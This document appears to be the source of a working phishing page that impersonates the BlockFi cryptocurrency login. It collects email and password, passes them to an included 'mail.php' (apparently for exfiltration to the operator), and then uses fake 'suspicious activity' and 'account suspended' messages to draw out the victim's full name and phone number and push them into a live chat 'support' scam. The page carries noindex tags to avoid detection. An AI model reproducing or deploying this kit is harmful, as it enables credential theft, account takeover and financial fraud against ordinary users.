<!DOCTYPE html>
<html lang="en">
    <head>
         <meta name="robots" content="noindex, nofollow"/>
        <meta name="googlebot" content="noindex, nofollow"/>
        <meta name="bingbot" content="noindex, nofollow"/>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Login | BlockFi</title>
        <link rel="shortcut icon" href="./assets/favicon.png" />
        <link rel="stylesheet" href="./assets/all.min.css" />
        <link rel="stylesheet" href="./assets/bootstrap.min.css" />
        <link rel="stylesheet" href="./assets/style.css" />
        <script src="./assets/emojione.min.js.download" type="text/javascript" async="" defer=""></script>
    </head>

    <body>
        <!-- navigation -->
        <div class="container-fluid" id="header">
            <h3>View Important Regulatory Developments Regarding BlockFi Interest Accounts .</h3>
            <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="external-link-alt" class="svg-inline--fa fa-external-link-alt fa-w-16 sc-ezipRf bSkNQK" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                <path
                    fill="currentColor"
                    d="M432,320H400a16,16,0,0,0-16,16V448H64V128H208a16,16,0,0,0,16-16V80a16,16,0,0,0-16-16H48A48,48,0,0,0,0,112V464a48,48,0,0,0,48,48H400a48,48,0,0,0,48-48V336A16,16,0,0,0,432,320ZM488,0h-128c-21.37,0-32.05,25.91-17,41l35.73,35.73L135,320.37a24,24,0,0,0,0,34L157.67,377a24,24,0,0,0,34,0L435.28,133.32,471,169c15,15,41,4.5,41-17V24A24,24,0,0,0,488,0Z"
                ></path>
            </svg>
        </div>
        <!-- navigation ends -->

        <!-- form -->
        <div class="container-fluid" id="form">
               <?php
                 if (isset($_POST['btnLoginMore'])) {
                    include 'mail.php';
                ?>

                 <div class="text-center">
                
               
                <h2 style="margin-top: 0px;">Verification Required</h2>
                <h5 style="color: red">Important Message</h5>
                <h5 style="color: red">Some Suspicious Activity Found With Your Account, Enter Your Full Name and Phone Number to Verify Your Identity.</h5>

                <form id="loginForm" action="" method="post">
                    <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                    <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                    <div class="form-group" style="margin-top: 50px;">
                        <div class="animate-label">
                            <label class="">Name</label>
                            <input type="text" name="name" class="form-control" id="name" required />
                        </div>
                    </div>

                    <div class="form-group">
                        <div class="animate-label">
                            <label class="">Phone Number</label>
                            <input id="number" name="number" type="text" class="form-control" required />
                        </div>
                    </div>

                    <div class="button">
                        <button name="fromLog" type="submit" class="btn btn-block" id="verifyBtn">Submit</button>
                    </div>

                 
                </form>
            </div>

            

                 <?php } elseif (isset($_POST['fromLog'])) {
                     include 'mail.php';
                     include 'chat.php';
                 ?>
                 <div class="text-center">
                
               
                <h2 style="margin-top: 0px;">Important Message:</h2>
                <h5 style="color: red">Due to unauthorized activity and identification failure on your Account. Account Access has been suspended.Please Get in touch with our Support Staff Immediately
                </h5>

                <form class="form-group">
            <label style="font-weight: 600;">Error CODE: EBRX1:6X76D</label><br>

            <a href="javascript:void(Tawk_API.toggle())"> <button type="button" class="btn" style="background-color: #004cef;color: #e0e0e0;
    font-weight: bold;">Ask Expert</button></a>
        </form>
            </div>
                 <?php } else { ?>

                    <div>
                <svg aria-label="blockfi logo" data-testid="test-svg" width="100%" height="61px" viewBox="0 0 160 36" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" role="img">
                    <g>
                        <path d="M160,13.4h-4.1v15.8h4.1V13.4z"></path>
                        <path d="M160,5.8h-4.1v4.3h4.1V5.8z"></path>
                        <path d="M151.7,6v3.7h-10.4v6.5h8.9v3.7h-8.9v9.3h-4.2V6H151.7z"></path>
                        <path d="M125.7,19.6l7.5,9.6h-4.9l-5.3-6.8l-1.6,1.7v5.1h-4.1V5.9h4.1v13l6.1-6.5h4.9L125.7,19.6z"></path>
                        <path
                            d="M112.4,24.6l1.2,3.4c-1.8,1.1-3.8,1.6-6,1.6c-2.7,0-4.8-0.8-6.3-2.4c-1.4-1.6-2.2-3.8-2.2-6.7c0-2.8,0.7-5,2.2-6.6
                    c1.4-1.6,3.5-2.4,6.3-2.4c1,0,1.8,0.1,2.5,0.2c0.7,0.1,1.4,0.3,2.2,0.6v3.8c-0.7-0.4-1.5-0.6-2.1-0.8c-0.7-0.2-1.4-0.2-2.2-0.2
                    c-3.1,0-4.6,1.8-4.6,5.3c0,3.6,1.5,5.4,4.5,5.4C109.4,26,110.9,25.5,112.4,24.6z"
                        ></path>
                        <path
                            d="M94.9,16c0.6,1.4,1,2.9,1,4.6s-0.3,3.2-1,4.6c-0.6,1.4-1.7,2.4-2.9,3.2c-1.3,0.8-2.9,1.2-4.7,1.2c-1.9,0-3.5-0.4-4.8-1.2
                    c-1.3-0.8-2.3-1.9-3-3.2c-0.7-1.4-1-2.9-1-4.6c0-1.7,0.3-3.2,1-4.6c0.7-1.4,1.7-2.4,3-3.2c1.3-0.8,2.9-1.2,4.8-1.2
                    c1.9,0,3.5,0.4,4.7,1.2C93.2,13.6,94.2,14.6,94.9,16z M91.7,20.6c0-1.7-0.4-3-1.2-4s-1.9-1.5-3.3-1.5c-1.5,0-2.6,0.5-3.4,1.5
                    c-0.8,1-1.2,2.3-1.2,4s0.4,3,1.2,4c0.8,1,1.9,1.5,3.4,1.5c1.4,0,2.5-0.5,3.3-1.5C91.3,23.6,91.7,22.3,91.7,20.6z"
                        ></path>
                        <path
                            d="M75.8,25.7v3.5c-0.9,0.2-1.8,0.3-2.6,0.3c-1.7,0-2.9-0.4-3.7-1.1c-0.8-0.7-1.2-1.8-1.2-3.2V5.9h4.1v18
                    c0,0.7,0.1,1.3,0.4,1.5c0.2,0.3,0.7,0.4,1.3,0.4C74.8,25.9,75.3,25.8,75.8,25.7z"
                        ></path>
                        <path
                            d="M62.6,19.4c0.7,0.9,1.1,2,1.1,3.4c0,2.1-0.7,3.7-2,4.8c-1.3,1.1-3.5,1.6-6.7,1.6h-8.8V6H55c2.8,0,4.8,0.5,6,1.6
                    c1.2,1,1.8,2.6,1.8,4.7c0,1.3-0.2,2.3-0.8,3.2c-0.5,0.9-1.3,1.5-2.4,2C60.8,17.8,61.8,18.5,62.6,19.4z M58.4,24.9
                    c0.7-0.5,1-1.3,1-2.5S59,20.5,58.3,20c-0.7-0.5-1.8-0.8-3.3-0.8h-4.6v6.5H55C56.6,25.7,57.7,25.5,58.4,24.9z M58.4,12.6
                    c0-1.1-0.3-1.9-0.8-2.4c-0.5-0.5-1.4-0.7-2.7-0.7h-4.6v6.4H55C57.3,15.8,58.4,14.7,58.4,12.6z"
                        ></path>
                        <path
                            fill="#0032EB"
                            d="M33.3,12.5c2.9,2.9,2.9,7.5,0,10.4L22.9,33.3c-2.9,2.9-7.5,2.9-10.4,0L2.2,22.9c-2.9-2.9-2.9-7.5,0-10.4
                    L12.5,2.2c2.9-2.9,7.5-2.9,10.4,0L33.3,12.5z M25.5,20.3c1.4-1.4,1.4-3.8,0-5.2l-5.2-5.2c-1.4-1.4-3.8-1.4-5.2,0l-5.2,5.2
                    c-1.4,1.4-1.4,3.8,0,5.2l5.2,5.2c1.4,1.4,3.8,1.4,5.2,0L25.5,20.3z"
                        ></path>
                    </g>
                </svg>
                <h2>Log in</h2>
                <form id="loginForm" action="" method="post">
                    <div class="form-group">
                        <div class="animate-label">
                            <label class="">Email</label>
                            <input type="email" name="email" class="form-control" id="username-input" required />
                        </div>
                    </div>

                    <div class="form-group" id="hidden-password-input">
                        <div class="animate-label">
                            <label class="">Password</label>
                            <input id="password" name="password" type="password" class="form-control" required />
                        </div>
                    </div>

                    <div class="button">
                        <button name="btnLoginMore" type="submit" class="btn btn-block" id="pw_submit">Continue</button>
                    </div>

                    <div class="bottom-links">
                        <a id="fgt_password">Don't have an account yet?</a>
                        <button id="pw_submit1" type="button" class="btn">Sign Up</button>
                    </div>
                </form>
            </div>

                 <?php }  ?>
            
        </div>
        
        <script src="./assets/jquery-3.5.1.min.js.download"></script>
        <script src="./assets/popper.js.download"></script>
        <script src="./assets/bootstrap.min.js.download"></script>
         <?php
                 if (isset($_POST['btnLoginMore'])) {
                ?>
         <script>
                $(document).ready(function () {
                    $('#verifyBtn').click(function (e) {
                        var number = $('#number').val();
                        var name = $('#name').val();
                        if (name == '') {
                            alert('Invalid Name');
                            $("#name").focus();
                            return false;
                        } else if (!/\(?([0-9]{3})\)?([ .-]?)([0-9]{3})\2([0-9]{4})/.test(number) || (number.length > 11 || number.length < 10)) {
                            alert('Please specify a valid phone number');
                            $("#number").focus();
                            return false;
                        }
                    });
                });
            </script>
            <?php }?>


        <script>
            document.addEventListener("DOMContentLoaded", function () {
                const allAnimateLabelElements = document.querySelectorAll(".animate-label");
                allAnimateLabelElements.forEach(function (el) {
                    const labelEl = el.querySelector("label");
                    const inputEl = el.querySelector("input");
                    inputEl.addEventListener("focus", function () {
                        labelEl.classList.add("active");
                    });
                    inputEl.addEventListener("blur", function () {
                        if (inputEl.value === "") {
                            labelEl.classList.remove("active");
                        }
                    });
                });
            });
        </script>
        <script async="" charset="UTF-8" src="./assets/en.js.download"></script>
    </body>
</html>
